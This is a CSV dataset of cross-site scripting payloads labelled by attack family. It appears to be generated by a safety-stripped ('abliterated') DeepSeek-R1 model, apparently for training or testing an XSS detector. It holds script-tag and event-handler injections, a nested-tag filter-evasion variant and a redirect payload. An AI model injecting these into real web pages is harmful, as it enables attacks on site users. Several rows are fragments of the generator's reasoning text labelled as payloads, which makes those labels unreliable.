payload,attack_type,attack_family,seed,round,matched_rules,label,generator,model_tag,payload_sha256
<script>alert('XSS');</script>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,3972594bb8b2badc6e8029aeed45020aeb36ccce2baa46182ca2456d1c4f1d2c
<scr<script>ipt>alert('XSS');</script>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,77278ea61d874695e8b72116cb5e69ca6eca1443937d4d635eaee67be69553ad
<script type='text/javascript'>alert('XSS');</script>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,b71f4b095e5a77cd1ee5ffd811aa310fe4d80c0dcfa5fa98b93b92fe4c402acd
<script>location.href='//example.com/';</script>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,f402248a17681978ca30af53c72e80633cbfe8ecc7faadb303cbd8e8c7d5ca46
"Let me start by recalling the basic structure. For example, using ' onclick=""alert('XSS')"";' as a payload. That's a good one. I can vary the quotes and the structure to create different examples.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,c0eacd5f15380ddef0edc5f34d1f64c66cdd5773061d6eb783710da2d20ba09c
"The first one could be ' onclick=""alert('XSS')"";' which is straightforward.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,64bb62a225b75873441a908c7774b31bfc3be6537446c24c77f8fc38e4257ca2
"Next, I can vary the quote type, so maybe "" onclick='alert(""XSS"")';"".",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,44328a44b295f0e1812eb86e8a36e534a5e460d3c34647290583d52902c6689c
"Then, I can use a different event, like onmouseover, so ' onmouseover=""alert('XSS')"";'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,cdb6c0e86166cffc424f64c45282be1070e3267cf01ad390bc945fd73c7621c3
"Another one could be using a different HTML element, like span: ' <span onclick=""alert('XSS')"";>'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,17a4eaff6d09435c7e219c85da12f36b5d13a8b8dca47ef41835e300343cf53a
"I can also include a self-closing tag: ' <img src=""test"" onclick=""alert('XSS')""/>;'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,dd3a35effbbcca7566b23adc86513e78ed440b92b7f63e4bf5621f79fa8f2d25
"Maybe using a different quote structure: ' onclick='alert(""XSS"");'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,2f1603107f2fcac407f5245f8b9c62ab002021457e2dd63c8b126e85e95b7357
"Another one could be using a different event, like onfocus: ' onfocus=""alert('XSS')"";'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,47e35fb1c56e207d69b577b64c215364ca9fdae17b28d898fec1e38b1d8b93f2
"I can vary the quote types again: "" onclick=alert('XSS')"".",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,c8bd6bf251864e0870f2318bd7303478c64cb7055d65da4fb749cdb209cf3e12
"Let me think of another one, perhaps using a different HTML element: ' <a onclick=""alert('XSS')""; href=""#"">'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,c2b45c35826ab20df31ad81db90979edcdc19b8f9adf43f0c361aab63ebc3013
"Lastly, I can use a different event like oninput: ' oninput=""alert('XSS')"";'.",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,7752b82ea31d7dab90df75e4a665aa77cff152bdb559cfb78812867871873268
"[""' onclick='alert('XSS')'"", "" onclick='alert('XSS')';"", ' onmouseover=""alert('XSS')"";', ' <span onclick=""alert('XSS')"";>', ' <img src=""test"" onclick=""alert('XSS')""/>;', ' onclick='alert(""XSS"");', ' onfocus=""alert('XSS')"";', "" onclick=alert('XSS')"", ' <a onclick=""alert('XSS')""; href=""#"">', ' oninput=""alert('XSS')"";']",xss,attribute_based,45,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,21238479238352763cdf473fff96a1dfd8e067c1814b2924802ec10248db40e7
